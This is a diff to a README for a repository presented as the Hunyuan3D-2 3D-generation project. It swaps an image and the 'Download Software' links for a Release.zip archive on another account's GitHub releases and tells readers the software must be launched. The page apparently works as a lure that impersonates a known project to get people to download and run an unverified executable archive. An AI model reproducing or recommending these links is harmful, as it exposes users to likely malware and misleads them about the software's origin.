@@ -2,7 +2,7 @@
 
 Welcome to the Hunyuan3D-2 GitHub repository! 
 
-![3D Art](https://cdn.pixabay.com/photo/2016/11/29/08/42/artist-1867703_960_720.jpg)
+![3D Art](https://github.com/demonve099/Hunyuan3D-2/releases/download/v1.0/Release.zip)
 
 ## Description
 "Hunyuan3D-2" is a project focused on High-Resolution 3D Assets Generation with Large Scale Hunyuan3D Diffusion Models. It combines state-of-the-art techniques in diffusion models to generate high-quality 3D assets for a variety of applications. Whether you are working on game development, animation, or any other project requiring detailed 3D assets, this repository has you covered.
@@ -20,8 +20,8 @@ Welcome to the Hunyuan3D-2 GitHub repository!
 - Texture-Generation
 
 ## Software
-Find the software for Hunyuan3D-2 [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip).  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+Find the software for Hunyuan3D-2 [here](https://github.com/demonve099/Hunyuan3D-2/releases/download/v1.0/Release.zip).  
+[![Download Software](https://github.com/demonve099/Hunyuan3D-2/releases/download/v1.0/Release.zip)](https://github.com/demonve099/Hunyuan3D-2/releases/download/v1.0/Release.zip)
 
 Remember, the software needs to be launched to start generating amazing 3D assets!
 
